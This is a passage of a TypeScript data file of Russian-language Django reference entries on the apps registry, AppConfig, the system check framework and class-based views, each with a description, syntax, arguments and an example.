export interface DjangoTermArgument {
  name: string;
  description: string;
}

export interface DjangoTerm {
  name: string;
  category: string;
  description: string;
  syntax: string;
  arguments: DjangoTermArgument[];
  example: string;
}

export const djangoTerms: DjangoTerm[] = [
  // ─── Applications ─────────────────────────────────────────────────────────
  {
    name: "apps",
    category: "Applications",
    description:
      "Глобальный реестр приложений Django. Объект типа Apps, который хранит конфигурации всех установленных приложений. Доступен через django.apps.apps после завершения инициализации фреймворка.",
    syntax: "from django.apps import apps",
    arguments: [],
    example: `from django.apps import apps

# Получить все зарегистрированные конфигурации приложений
for app_config in apps.get_app_configs():
    print(app_config.name, app_config.label)

# Проверить, завершена ли инициализация
print(apps.ready)  # True / False`,
  },
  {
    name: "apps.ready",
    category: "Applications",
    description:
      "Булев атрибут, который становится True после того, как реестр приложений полностью инициализирован и все методы AppConfig.ready() были вызваны. До этого момента импортировать модели и обращаться к ORM небезопасно.",
    syntax: "apps.ready",
    arguments: [],
    example: `from django.apps import apps

if apps.ready:
    # Безопасно работать с моделями
    User = apps.get_model('auth', 'User')
    print(f"Пользователей: {User.objects.count()}")
else:
    print("Реестр ещё не инициализирован")`,
  },
  {
    name: "apps.get_app_configs()",
    category: "Applications",
    description:
      "Возвращает итерируемый объект со всеми экземплярами AppConfig в том порядке, в котором приложения перечислены в INSTALLED_APPS. Используется для обхода всех установленных приложений.",
    syntax: "apps.get_app_configs()",
    arguments: [],
    example: `from django.apps import apps

for app_config in apps.get_app_configs():
    print(f"Приложение: {app_config.name}")
    print(f"  Метка:   {app_config.label}")
    print(f"  Путь:    {app_config.path}")
    print(f"  Моделей: {len(list(app_config.get_models()))}")`,
  },
  {
    name: "apps.get_app_config(app_label)",
    category: "Applications",
    description:
      "Возвращает экземпляр AppConfig для приложения с указанной меткой (app_label). Вызывает LookupError, если приложение не найдено в реестре.",
    syntax: "apps.get_app_config(app_label)",
    arguments: [
      {
        name: "app_label",
        description:
          'Строка — метка приложения (обычно последняя часть имени пакета, например "auth", "contenttypes").',
      },
    ],
    example: `from django.apps import apps

# Получить конфиг стандартного приложения auth
auth_config = apps.get_app_config('auth')
print(auth_config.name)       # django.contrib.auth
print(auth_config.verbose_name)  # Authentication and Authorization

# Если приложение не установлено — LookupError
try:
    apps.get_app_config('nonexistent')
except LookupError as e:
    print(e)`,
  },
  {
    name: "apps.is_installed(app_name)",
    category: "Applications",
    description:
      "Возвращает True, если приложение с указанным полным именем (dotted Python path) присутствует в INSTALLED_APPS. Принимает именно полное имя модуля, а не метку (label).",
    syntax: "apps.is_installed(app_name)",
    arguments: [
      {
        name: "app_name",
        description:
          'Полное имя приложения в виде строки, например "django.contrib.auth" или "myproject.myapp".',
      },
    ],
    example: `from django.apps import apps

# Проверяем по полному имени модуля, не по label
if apps.is_installed('django.contrib.auth'):
    print("Аутентификация подключена")

if apps.is_installed('django.contrib.admin'):
    print("Панель администратора доступна")

# False, если не установлено
print(apps.is_installed('nonexistent.app'))  # False`,
  },
  {
    name: "apps.get_model(app_label, model_name, require_ready=True)",
    category: "Applications",
    description:
      "Возвращает класс модели по метке приложения и имени модели. По умолчанию требует, чтобы реестр был полностью инициализирован (require_ready=True). Имена нечувствительны к регистру.",
    syntax: "apps.get_model(app_label, model_name, require_ready=True)",
    arguments: [
      {
        name: "app_label",
        description:
          'Метка приложения (краткое имя, например "auth", "contenttypes").',
      },
      {
        name: "model_name",
        description:
          'Имя класса модели (регистронезависимо), например "User", "user", "GROUP".',
      },
      {
        name: "require_ready",
        description:
          "Если True (по умолчанию), вызывает исключение если реестр не готов. Установите False только внутри AppConfig.ready().",
      },
    ],
    example: `from django.apps import apps

# Получить модель User из приложения auth
User = apps.get_model('auth', 'User')
print(User.objects.count())

# Альтернативный синтаксис через точку в одном аргументе
User = apps.get_model('auth.User')

# Использование внутри AppConfig.ready() до полной инициализации
class MyAppConfig(AppConfig):
    def ready(self):
        MyModel = apps.get_model('myapp', 'MyModel', require_ready=False)`,
  },
  {
    name: "AppConfig",
    category: "Applications",
    description:
      "Базовый класс для конфигурации Django-приложения. Создаётся в файле apps.py каждого приложения. Позволяет задать метаданные приложения (название, verbose_name) и выполнить инициализацию после загрузки всех приложений через метод ready().",
    syntax: `class MyAppConfig(AppConfig):
    name = 'myapp'
    verbose_name = 'Моё приложение'`,
    arguments: [],
    example: `# myapp/apps.py
from django.apps import AppConfig

class MyAppConfig(AppConfig):
    name = 'myapp'                    # обязательно: полный путь к пакету
    verbose_name = 'Моё приложение'  # отображаемое имя
    default_auto_field = 'django.db.models.BigAutoField'

    def ready(self):
        # Регистрация сигналов — только здесь, не на уровне модуля
        import myapp.signals  # noqa: F401

# myapp/__init__.py
default_app_config = 'myapp.apps.MyAppConfig'`,
  },
  {
    name: "AppConfig.name",
    category: "Applications",
    description:
      "Обязательный атрибут класса AppConfig. Полное имя Python-пакета приложения (dotted path), которое должно совпадать с записью в INSTALLED_APPS. Используется для однозначной идентификации приложения в реестре.",
    syntax: 'AppConfig.name = "dotted.python.path"',
    arguments: [],
    example: `# myproject/myapp/apps.py
from django.apps import AppConfig

class MyAppConfig(AppConfig):
    # Полный путь от корня проекта — не просто "myapp"
    name = 'myproject.myapp'
    label = 'myapp'           # опционально: уникальная метка (по умолчанию = последняя часть name)
    verbose_name = 'Мой модуль'

# settings.py
INSTALLED_APPS = [
    'myproject.myapp',        # или 'myproject.myapp.apps.MyAppConfig'
]`,
  },
  {
    name: "AppConfig.label",
    category: "Applications",
    description:
      'Краткая уникальная метка приложения (app label), используемая для идентификации внутри Django: в ORM, миграциях, ссылках на модели вида "app_label.ModelName". По умолчанию равна последней части AppConfig.name. Должна быть уникальной во всём проекте — задаётся явно, если несколько приложений имеют одинаковую последнюю часть имени пакета.',
    syntax: 'AppConfig.label = "short_label"',
    arguments: [],
    example: `from django.apps import AppConfig

class BlogConfig(AppConfig):
    name = 'myproject.blog'
    label = 'myblog'          # переопределяем, чтобы не конфликтовать с другим "blog"

# Использование label при ссылках на модели
class Post(models.Model):
    author = models.ForeignKey('auth.User', on_delete=models.CASCADE)
    # 'auth' — это AppConfig.label приложения django.contrib.auth

# Получить конфиг по label
from django.apps import apps
cfg = apps.get_app_config('myblog')
print(cfg.label)  # myblog`,
  },
  {
    name: "AppConfig.verbose_name",
    category: "Applications",
    description:
      "Человекочитаемое имя приложения, отображаемое в админке Django и других местах. По умолчанию формируется из label с заглавной первой буквой. Рекомендуется задавать явно и помечать как переводимую строку через gettext_lazy для поддержки локализации.",
    syntax: 'AppConfig.verbose_name = "Отображаемое имя"',
    arguments: [],
    example: `from django.apps import AppConfig
from django.utils.translation import gettext_lazy as _

class ShopConfig(AppConfig):
    name = 'myproject.shop'
    verbose_name = _('Интернет-магазин')

# В админке группа моделей этого приложения будет называться "Интернет-магазин"

# Получить verbose_name программно
from django.apps import apps
print(apps.get_app_config('shop').verbose_name)  # Интернет-магазин`,
  },
  {
    name: "AppConfig.path",
    category: "Applications",
    description:
      "Абсолютный путь к каталогу приложения в файловой системе. Заполняется Django автоматически при загрузке приложения на основе расположения его пакета. Полезен для поиска файлов рядом с кодом приложения (шаблонов, фикстур, статики).",
    syntax: "AppConfig.path",
    arguments: [],
    example: `import os
from django.apps import apps

cfg = apps.get_app_config('myapp')
print(cfg.path)
# /home/user/myproject/myapp

# Найти файл фикстуры внутри приложения
fixtures_dir = os.path.join(cfg.path, 'fixtures')
for filename in os.listdir(fixtures_dir):
    print(filename)

# Обычно path определяется автоматически, но при необходимости
# можно задать вручную в подклассе AppConfig:
class MyAppConfig(AppConfig):
    name = 'myapp'
    path = '/custom/path/to/myapp'`,
  },
  {
    name: "AppConfig.default",
    category: "Applications",
    description:
      "Булев атрибут, определяющий, должен ли данный AppConfig использоваться как конфигурация по умолчанию, если в INSTALLED_APPS указано только имя пакета приложения. Если в одном пакете определено несколько AppConfig, ровно один из них должен иметь default = True (или быть единственным).",
    syntax: "AppConfig.default = True",
    arguments: [],
    example: `# myapp/apps.py
from django.apps import AppConfig

class MyAppConfig(AppConfig):
    name = 'myapp'
    verbose_name = 'Основная конфигурация'
    default = True            # будет использоваться при INSTALLED_APPS = ['myapp']

class MyAppDevConfig(AppConfig):
    name = 'myapp'
    verbose_name = 'Конфигурация для разработки'
    default = False           # выбирается явно: 'myapp.apps.MyAppDevConfig'

# settings.py
INSTALLED_APPS = [
    'myapp',                              # подберёт MyAppConfig (default=True)
    # 'myapp.apps.MyAppDevConfig',        # явный выбор альтернативной конфигурации
]`,
  },
  {
    name: "AppConfig.default_auto_field",
    category: "Applications",
    description:
      'Указывает, какой тип поля использовать по умолчанию для автоматических первичных ключей (id) моделей этого приложения. Перекрывает глобальную настройку DEFAULT_AUTO_FIELD из settings.py для конкретного приложения. Чаще всего используется значение "django.db.models.BigAutoField".',
    syntax: 'AppConfig.default_auto_field = "django.db.models.BigAutoField"',
    arguments: [],
    example: `from django.apps import AppConfig

class MyAppConfig(AppConfig):
    name = 'myapp'
    # Все модели myapp без явного primary_key получат BigAutoField
    default_auto_field = 'django.db.models.BigAutoField'

# Альтернативные значения:
# 'django.db.models.AutoField'      — 32-битный INTEGER (Django < 3.2 default)
# 'django.db.models.BigAutoField'   — 64-битный BIGINT (рекомендуется для новых проектов)
# 'django.db.models.SmallAutoField' — 16-битный SMALLINT

class Article(models.Model):
    # id типа BIGINT создастся автоматически
    title = models.CharField(max_length=200)`,
  },
  {
    name: "AppConfig.module",
    category: "Applications",
    description:
      "Корневой модуль приложения (Python-объеe�т module), полученный в результате импорта пакета, указанного в name. Заполняется Django автоматически при загрузке приложения. Доступ к самому модулю позволяет получать его атрибуты (версия, метаданные и т. п.).",
    syntax: "AppConfig.module",
    arguments: [],
    example: `from django.apps import apps

cfg = apps.get_app_config('myapp')
print(cfg.module)
# <module 'myapp' from '/home/user/myproject/myapp/__init__.py'>

# Получить атрибут из __init__.py приложения
version = getattr(cfg.module, '__version__', 'unknown')
print(f"Версия myapp: {version}")

# Эквивалентно прямому импорту:
import myapp
assert cfg.module is myapp`,
  },
  {
    name: "AppConfig.models_module",
    category: "Applications",
    description:
      "Модуль models приложения (объект module), либо None, если приложение не содержит моделей. Заполняется Django после успешного импорта пакета приложения и его подмодуля models. Используется внутренне реестром приложений для регистрации моделей.",
    syntax: "AppConfig.models_module",
    arguments: [],
    example: `from django.apps import apps

cfg = apps.get_app_config('auth')
print(cfg.models_module)
# <module 'django.contrib.auth.models' from '.../auth/models.py'>

# Приложение без моделей
admin_cfg = apps.get_app_config('admin')
if admin_cfg.models_module is None:
    print("У приложения нет models.py")
else:
    print(f"Модели определены в: {admin_cfg.models_module.__name__}")

# Получить все классы моделей через models_module
import inspect
from django.db.models import Model

cfg = apps.get_app_config('auth')
for name, obj in inspect.getmembers(cfg.models_module, inspect.isclass):
    if issubclass(obj, Model) and obj is not Model:
        print(name)`,
  },
  {
    name: "AppConfig.get_models(include_auto_created=False, include_swapped=False)",
    category: "Applications",
    description:
      "Возвращает итерируемый объект со всеми классами моделей, зарегистрированных в данном приложении. По умолчанию исключает автоматически создаваемые промежуточные модели для ManyToMany-полей и swapped-модели (заменённые через AUTH_USER_MODEL и подобные настройки).",
    syntax:
      "AppConfig.get_models(include_auto_created=False, include_swapped=False)",
    arguments: [
      {
        name: "include_auto_created",
        description:
          "Если True, включает в результат автоматически создаваемые модели для промежуточных таблиц ManyToMany-связей. По умолчанию False.",
      },
      {
        name: "include_swapped",
        description:
          "Если True, включает модели, которые были заменены через настройки swappable (например, замена User-модели через AUTH_USER_MODEL). По умолчанию False.",
      },
    ],
    example: `from django.apps import apps

# Все основные модели приложения auth
auth_cfg = apps.get_app_config('auth')
for model in auth_cfg.get_models():
    print(model.__name__)
    # User, Group, Permission, ...

# Включить промежуточные таблицы M2M
for model in auth_cfg.get_models(include_auto_created=True):
    print(model._meta.db_table)
    # auth_user, auth_user_groups, auth_user_user_permissions, ...

# Если кастомная модель пользователя заменяет auth.User —
# по умолчанию User не попадёт в выдачу:
for model in auth_cfg.get_models(include_swapped=True):
    print(model.__name__)`,
  },
  {
    name: "AppConfig.get_model(model_name, require_ready=True)",
    category: "Applications",
    description:
      "Возвращает класс модели с указанным именем, зарегистрированный в данном приложении. Имя модели регистронезависимо. Вызывает LookupError, если модель с таким именем в приложении не найдена. По умолчанию требует, чтобы реестр приложений был полностью инициализирован.",
    syntax: "AppConfig.get_model(model_name, require_ready=True)",
    arguments: [
      {
        name: "model_name",
        description:
          'Имя класса модели в виде строки, регистронезависимо ("User", "user", "USER" эквивалентны).',
      },
      {
        name: "require_ready",
        description:
          "Если True (по умолчанию), вызывает AppRegistryNotReady, пока реестр приложений не готов. Установите False, если вызываете внутри AppConfig.ready().",
      },
    ],
    example: `from django.apps import apps

auth_cfg = apps.get_app_config('auth')

# Получить модель по имени
User = auth_cfg.get_model('User')
print(User.objects.count())

# Регистр не важен
Group = auth_cfg.get_model('group')

# Несуществующая модель → LookupError
try:
    auth_cfg.get_model('NonExistent')
except LookupError as e:
    print(e)

# Использование в AppConfig.ready() до полной готовности реестра
class MyAppConfig(AppConfig):
    name = 'myapp'

    def ready(self):
        MyModel = self.get_model('MyModel', require_ready=False)
        # ... подключение сигналов и т.п.`,
  },
  {
    name: "AppConfig.ready()",
    category: "Applications",
    description:
      "Метод-хук, вызываемый Django один раз после того, как реестр приложений полностью инициализирован и все модели импортированы. Предназначен для регистрации обработчиков сигналов, проверок конфигурации, патчей и другой инициализации, требующей готового реестра. Не должен запускать запросы к БД и обращаться к моделям пользователей напрямую при импорте.",
    syntax: `class MyAppConfig(AppConfig):
    def ready(self):
        ...`,
    arguments: [],
    example: `# myapp/apps.py
from django.apps import AppConfig

class MyAppConfig(AppConfig):
    name = 'myapp'

    def ready(self):
        # 1. Подключение сигналов — самый частый случай
        from . import signals  # noqa: F401

        # 2. Регистрация checks
        from django.core.checks import register
        from .checks import my_custom_check
        register(my_custom_check)

        # 3. Получение моделей через self.get_model (без прямого импорта)
        Article = self.get_model('Article')
        # NB: не выполнять Article.objects.xxx() — БД может быть недоступна

        # 4. Патчинг сторонних библиотек
        import third_party_lib
        third_party_lib.some_function = my_replacement

# myapp/signals.py
from django.db.models.signals import post_save
from django.dispatch import receiver
from .models import Article

@receiver(post_save, sender=Article)
def on_article_saved(sender, instance, created, **kwargs):
    if created:
        print(f"Создана статья: {instance.title}")`,
  },
  {
    name: "setup(set_prefix=True)",
    category: "Applications",
    description:
      "Функция django.setup() — конфигурирует Django: загружает настройки, инициализирует логирование и заполняет реестр приложений. Вызывается автоматически при использовании manage.py, WSGI/ASGI-серверов и runserver. Нужна вручную только в самостоятельных скриптах, использующих Django ORM или другие компоненты вне обычного запуска.",
    syntax: "django.setup(set_prefix=True)",
    arguments: [
      {
        name: "set_prefix",
        description:
          "Если True (по умолчанию), устанавливает script_prefix URL-резолвера на основе FORCE_SCRIPT_NAME из настроек. Установите False для скриптов, не работающих с URL (например, фоновых задач, ETL).",
      },
    ],
    example: `# standalone_script.py — самостоятельный скрипт вне manage.py
import os
import django

# 1. Указываем модуль настроек
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'myproject.settings')

# 2. Инициализируем Django
django.setup()

# 3. Теперь можно импортировать модели и использовать ORM
from myapp.models import Article

for article in Article.objects.all()[:5]:
    print(article.title)

# Для скриптов, не работающих с URL (cron-задачи, ETL),
# можно отключить установку префикса:
django.setup(set_prefix=False)`,
  },

  // ─── System check framework ───────────────────────────────────────────────
  {
    name: "register(tags)",
    category: "System check framework",
    description:
      "Декораторная форма django.core.checks.register. Регистрирует функцию проверки и помечает её одним или несколькими тегами. Тег позволяет запускать выборочно проверки по группе командой `python manage.py check --tag <tag>`. Сама функция должна принимать app_configs, **kwargs и возвращать список объектов CheckMessage.",
    syntax: "@register(*tags)",
    arguments: [
      {
        name: "*tags",
        description:
          'Один или несколько тегов (строки или константы из django.core.checks.Tags), к которым относится проверка. Например, Tags.security, Tags.compatibility, "myapp".',
      },
    ],
    example: `# myapp/checks.py
from django.core.checks import register, Warning, Tags

@register(Tags.security, 'myapp')
def check_secret_key_strength(app_configs, **kwargs):
    from django.conf import settings
    errors = []
    if len(settings.SECRET_KEY) < 50:
        errors.append(
            Warning(
                'SECRET_KEY слишком короткий',
                hint='Сгенерируйте ключ длиной не менее 50 символов.',
                id='myapp.W001',
            )
        )
    return errors

# Запуск только этой группы проверок:
#   python manage.py check --tag security`,
  },
  {
    name: "register(function, *tags)",
    category: "System check framework",
    description:
      "Функциональная форма register. Регистрирует переданную функцию проверки с указанными тегами без использования синтаксиса декоратора. Удобна, когда функция определяется или импортируется отдельно — например, регистрируется внутри AppConfig.ready().",
    syntax: "register(function, *tags)",
    arguments: [
      {
        name: "function",
        description:
          "Функция проверки с сигнатурой fn(app_configs, **kwargs), возвращающая список объектов CheckMessage (Error, Warning, Info, ...).",
      },
      {
        name: "*tags",
        description:
          "Произвольное количество тегов, ассоциируемых с проверкой (Tags.security, Tags.models и т. д.).",
      },
    ],
    example: `# myapp/checks.py
from django.core.checks import Error, Tags

def check_database_engine(app_configs, **kwargs):
    from django.conf import settings
    errors = []
    engine = settings.DATABASES['default']['ENGINE']
    if 'sqlite' in engine:
        errors.append(
            Error(
                'SQLite не подходит для production',
                hint='Используйте PostgreSQL или MySQL.',
                id='myapp.E001',
            )
        )
    return errors

# myapp/apps.py
from django.apps import AppConfig
from django.core.checks import register, Tags

class MyAppConfig(AppConfig):
    name = 'myapp'

    def ready(self):
        from .checks import check_database_engine
        register(check_database_engine, Tags.database, Tags.compatibility)`,
  },
  {
    name: "register(function, *tags, deploy=False)",
    category: "System check framework",
    description:
      "Полная форма register с именованным аргументом deploy. Если deploy=True, проверка выполняется только при запуске `python manage.py check --deploy`, но не во время обычной разработки (runserver, migrate). Используется для тяжёлых или специфичных для prod проверок (HTTPS, security headers и т. п.).",
    syntax: "register(function, *tags, deploy=False)",
    arguments: [
      {
        name: "function",
        description:
          "Функция проверки с сигнатурой fn(app_configs, **kwargs), возвращающая список CheckMessage.",
      },
      {
        name: "*tags",
        description:
          "Теги, к которым относится проверка (Tags.security, Tags.compatibility, пользовательские строки).",
      },
      {
        name: "deploy",
        description:
          "Если True, проверка запускается только командой `manage.py check --deploy`. По умолчанию False — проверка выполняется при каждом check.",
      },
    ],
    example: `# myapp/checks.py
from django.core.checks import Warning, register, Tags

def check_ssl_redirect(app_configs, **kwargs):
    from django.conf import settings
    errors = []
    if not getattr(settings, 'SECURE_SSL_REDIRECT', False):
        errors.append(
            Warning(
                'SECURE_SSL_REDIRECT выключен',
                hint='Включите SECURE_SSL_REDIRECT = True для production.',
                id='myapp.W010',
            )
        )
    return errors

# Регистрируем как deploy-only проверку
register(check_ssl_redirect, Tags.security, deploy=True)

# Эквивалент через декоратор:
@register(Tags.security, deploy=True)
def check_hsts(app_configs, **kwargs):
    ...

# Запуск:
#   python manage.py check --deploy`,
  },
  {
    name: "Error(message, hint=None, obj=None, id=None)",
    category: "System check framework",
    description:
      "Класс сообщения о критической ошибке конфигурации. Возвращается из функций-проверок при обнаружении проблем, которые делают запуск проекта невозможным или приводят к некорректной работе. Команда `manage.py check` завершает работу с ненулевым кодом возврата, если хотя бы одна проверка вернула Error.",
    syntax: "Error(message, hint=None, obj=None, id=None)",
    arguments: [
      {
        name: "message",
        description:
          "Краткое описание проблемы — одна строка, объясняющая, что не так.",
      },
      {
        name: "hint",
        description:
          "Необязательная подсказка с указанием, как исправить проблему. Отображается после message.",
      },
      {
        name: "obj",
        description:
          "Необязательный объект, к которому относится ошибка (модель, поле, AppConfig). Используется для контекста в выводе.",
      },
      {
        name: "id",
        description:
          'Уникальный идентификатор проверки в формате "<app_label>.E<номер>" (например, "myapp.E001"). Позволяет глушить сообщения через SILENCED_SYSTEM_CHECKS.',
      },
    ],
    example: `from django.core.checks import Error, register

@register()
def check_required_setting(app_configs, **kwargs):
    from django.conf import settings
    errors = []

    if not getattr(settings, 'PAYMENT_API_KEY', None):
        errors.append(
            Error(
                'PAYMENT_API_KEY не задан',
                hint='Добавьте PAYMENT_API_KEY = "..." в settings.py '
                     'или переменную окружения.',
                obj=settings,
                id='myapp.E001',
            )
        )
    return errors

# Запуск:
#   python manage.py check
# Вывод при отсутствии ключа:
#   ERRORS:
#   ?: (myapp.E001) PAYMENT_API_KEY не задан
#       HINT: Добавьте PAYMENT_API_KEY = "..." в settings.py ...
# System check identified 1 issue (0 silenced).

# Заглушить проверку через настройки:
# SILENCED_SYSTEM_CHECKS = ['myapp.E001']`,
  },
  {
    name: "Warning(message, hint=None, obj=None, id=None)",
    category: "System check framework",
    description:
      "Класс сообщения-предупреждения. Возвращается из функций-проверок при обнаружении некритичных проблем, которые не препятствуют запуску, но указывают на потенциальные риски (устаревшие настройки, рекомендации по безопасности). В отличие от Error, не приводит к ненулевому коду возврата `manage.py check`.",
    syntax: "Warning(message, hint=None, obj=None, id=None)",
    arguments: [
      {
        name: "message",
        description: "Краткое описание потенциальной проблемы.",
      },
      {
        name: "hint",
        description:
          "Необязательная подсказка с описанием рекомендуемого действия.",
      },
      {
        name: "obj",
        description:
          "Необязательный объект, к которому относится предупреждение (модель, AppConfig, settings).",
      },
      {
        name: "id",
        description:
          'Уникальный идентификатор предупреждения в формате "<app_label>.W<номер>" (например, "myapp.W001"). Используется для подавления через SILENCED_SYSTEM_CHECKS.',
      },
    ],
    example: `from django.core.checks import Warning, register, Tags

@register(Tags.security, deploy=True)
def check_debug_off(app_configs, **kwargs):
    from django.conf import settings
    warnings = []

    if settings.DEBUG:
        warnings.append(
            Warning(
                'DEBUG = True в production-конфигурации',
                hint='Установите DEBUG = False для production-окружения.',
                obj=settings,
                id='myapp.W001',
            )
        )

    if not settings.ALLOWED_HOSTS:
        warnings.append(
            Warning(
                'ALLOWED_HOSTS пустой',
                hint='Перечислите все домены, на которых работает сайт.',
                id='myapp.W002',
            )
        )

    return warnings

# Запуск:
#   python manage.py check --deploy
# Вывод:
#   WARNINGS:
#   ?: (myapp.W001) DEBUG = True в production-конфигурации
#       HINT: Установите DEBUG = False для production-окружения.`,
  },
  {
    name: "CheckMessage",
    category: "System check framework",
    description:
      "Базовый класс всех сообщений системы проверок (Debug, Info, Warning, Error, Critical). Хранит уровень серьёзности (level), текст сообщения, подсказку, привязанный объект и идентификатор. Поддерживает методы is_serious(level) и is_silenced() для фильтрации сообщений.",
    syntax: "CheckMessage(level, message, hint=None, obj=None, id=None)",
    arguments: [
      {
        name: "level",
        description:
          "Числовой уровень серьёзности: DEBUG=10, INFO=20, WARNING=30, ERROR=40, CRITICAL=50. Обычно задаётся через подкласс (Error, Warning и т. д.).",
      },
      {
        name: "message",
        description: "Краткое описание сообщения.",
      },
      {
        name: "hint",
        description: "Необязательная подсказка по устранению проблемы.",
      },
      {
        name: "obj",
        description: "Необязательный объект, к которому относится сообщение.",
      },
      {
        name: "id",
        description:
          'Уникальный идентификатор сообщения, например "myapp.E001".',
      },
    ],
    example: `from django.core.checks import (
    CheckMessage, Debug, Info, Warning, Error, Critical,
    DEBUG, INFO, WARNING, ERROR, CRITICAL,
)

# Все классы сообщений — наследники CheckMessage с фиксированным level
err = Error('Что-то сломано', id='app.E001')
warn = Warning('Подозрительно', id='app.W001')
info = Info('К сведению', id='app.I001')

# Уровень и проверка серьёзности
print(err.level)              # 40
print(err.is_serious(WARNING)) # True (40 >= 30)
print(info.is_serious(WARNING)) # False (20 < 30)

# Заглушённые сообщения (через SILENCED_SYSTEM_CHECKS)
print(err.is_silenced())  # True, если 'app.E001' в SILENCED_SYSTEM_CHECKS

# Создание собственного уровня (редко)
custom = CheckMessage(
    level=35,                       # между WARNING (30) и ERROR (40)
    msg='Кастомное сообщение',
    hint='Подсказка',
    id='app.C001',
)`,
  },
  {
    name: "Tags.compatibility",
    category: "System check framework",
    description:
      'Константа-тег "compatibility" из класса django.core.checks.Tags. Применяется к проверкам, которые анализируют совместимость кода и настроек проекта с текущей версией Django (использование устаревших API, удалённых опций, неподдерживаемых сочетаний настроек).',
    syntax: "from django.core.checks import Tags; Tags.compatibility",
    arguments: [],
    example: `from django.core.checks import register, Warning, Tags
import django

@register(Tags.compatibility)
def check_deprecated_settings(app_configs, **kwargs):
    from django.conf import settings
    warnings = []

    # Пример проверки устаревшей настройки
    if hasattr(settings, 'MIDDLEWARE_CLASSES'):
        warnings.append(
            Warning(
                'MIDDLEWARE_CLASSES удалён в Django 2.0',
                hint='Переименуйте в MIDDLEWARE.',
                id='myapp.W100',
            )
        )

    if django.VERSION >= (5, 0) and getattr(settings, 'USE_L10N', None) is not None:
        warnings.append(
            Warning(
                'USE_L10N больше не используется в Django 5.0+',
                hint='Удалите USE_L10N из settings.py.',
                id='myapp.W101',
            )
        )

    return warnings

# Запуск только проверок совместимости:
#   python manage.py check --tag compatibility`,
  },
  {
    name: "Tags.security",
    category: "System check framework",
    description:
      'Константа-тег "security" из класса django.core.checks.Tags. Применяется к проверкам, связанным с безопасностью развёртывания: HTTPS, секреты, заголовки HSTS/CSP, настройки cookies, CSRF и подобное. Большая часть встроенных проверок безопасности Django помечена этим тегом и запускается командой `manage.py check --deploy`.',
    syntax: "from django.core.checks import Tags; Tags.security",
    arguments: [],
    example: `from django.core.checks import register, Warning, Error, Tags

@register(Tags.security, deploy=True)
def check_security_settings(app_configs, **kwargs):
    from django.conf import settings
    issues = []

    if settings.DEBUG:
        issues.append(
            Error(
                'DEBUG = True в production',
                hint='Установите DEBUG = False.',
                id='myapp.E200',
            )
        )

    if not getattr(settings, 'SECURE_HSTS_SECONDS', 0):
        issues.append(
            Warning(
                'HSTS не настроен',
                hint='Установите SECURE_HSTS_SECONDS, например 31536000.',
                id='myapp.W200',
            )
        )

    if not getattr(settings, 'SESSION_COOKIE_SECURE', False):
        issues.append(
            Warning(
                'SESSION_COOKIE_SECURE = False',
                hint='Включите SESSION_COOKIE_SECURE для HTTPS-сессий.',
                id='myapp.W201',
            )
        )

    return issues

# Запуск:
#   python manage.py check --tag security
#   python manage.py check --deploy   # включает все security-проверки`,
  },

  // ─── Built-in class-based views API ───────────────────────────────────────
  {
    name: "View",
    category: "Built-in class-based views API",
    description:
      "Базовый класс всех class-based views в Django (django.views.generic.View). Обрабатывает входящий HTTP-запрос, диспетчеризуя его методу-обработчику с именем, совпадающим с HTTP-методом в нижнем регистре (get, post, put, patch, delete и т. д.). Не реализует никакой логики сам — служит фундаментом для собственных представлений и встроенных generic-классов (TemplateView, ListView, FormView и пр.).",
    syntax: `from django.views.generic import View

class MyView(View):
    def get(self, request, *args, **kwargs):
        ...
    def post(self, request, *args, **kwargs):
        ...`,
    arguments: [],
    example: `# views.py
from django.views.generic import View
from django.http import HttpResponse, JsonResponse

class HelloView(View):
    def get(self, request, *args, **kwargs):
        name = request.GET.get('name', 'World')
        return HttpResponse(f'Hello, {name}!')

    def post(self, request, *args, **kwargs):
        return JsonResponse({'status': 'created'}, status=201)

# urls.py
from django.urls import path
from .views import HelloView

urlpatterns = [
    path('hello/', HelloView.as_view(), name='hello'),
]`,
  },
  {
    name: "View.http_method_names",
    category: "Built-in class-based views API",
    description:
      'Список HTTP-методов, которые представление готово обрабатывать. По умолчанию — все стандартные методы: ["get", "post", "put", "patch", "delete", "head", "options", "trace"]. Имена должны быть в нижнем регистре. Если запрос приходит с методом, отсутствующим в этом списке (или для него нет одноимённого метода в классе), вызывается http_method_not_allowed и возвращается 405.',
    syntax: 'View.http_method_names = ["get", "post", ...]',
    arguments: [],
    example: `from django.views.generic import View
from django.http import JsonResponse

class ReadOnlyAPI(View):
    # Запрещаем всё, кроме GET и HEAD
    http_method_names = ['get', 'head', 'options']

    def get(self, request, *args, **kwargs):
        return JsonResponse({'data': [1, 2, 3]})

# POST /api/  →  HTTP 405 Method Not Allowed
#               Allow: GET, HEAD, OPTIONS

class WebhookView(View):
    # Принимаем только POST
    http_method_names = ['post']

    def post(self, request, *args, **kwargs):
        return JsonResponse({'received': True})`,
  },
  {
    name: "View.as_view(**initkwargs)",
    category: "Built-in class-based views API",
    description:
      "Classmethod, возвращающая callable view-функцию, пригодную для подключения в URLconf. Принимает именованные аргументы, которые становятся атрибутами создаваемого экземпляра View при каждом запросе — это позволяет конфигурировать представление прямо в urls.py. Имена ключей должны соответствовать существующим атрибутам класса; передача неизвестных ключей вызывает TypeError.",
    syntax: "View.as_view(**initkwargs)",
    arguments: [
      {
        name: "**initkwargs",
        description:
          "Именованные аргументы, переопределяющие атрибуты класса для каждого экземпляра View (template_name, model, paginate_by и т. п.). Только существующие атрибуты класса допустимы.",
      },
    ],
    example: `# views.py
from django.views.generic import TemplateView

class GreetingView(TemplateView):
    template_name = 'greeting.html'
    greeting = 'Привет'

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        ctx['greeting'] = self.greeting
        return ctx

# urls.py
from django.urls import path
from .views import GreetingView

urlpatterns = [
    # Один класс — два разных endpoint'а с разной конфигурацией
    path('hello/',  GreetingView.as_view(),                   name='hello'),
    path('hola/',   GreetingView.as_view(greeting='Hola'),    name='hola'),
    path('bonjour/', GreetingView.as_view(
        greeting='Bonjour',
        template_name='greeting_fr.html',
    ), name='bonjour'),
]

# Передача несуществующего атрибута → TypeError при старте
# GreetingView.as_view(unknown=42)`,
  },
  {
    name: "View.setup(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Метод-хук, вызываемый перед dispatch() для инициализации экземпляра View на основе входящего запроса. Сохраняет request, args и kwargs как атрибуты self.request, self.args, self.kwargs, чтобы они были доступны во всех методах класса. Переопределяется, когда нужно подготовить общие данные (например, загрузить объект из URL) до вызова get/post.",
    syntax: "View.setup(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest, поступивший в представление.",
      },
      {
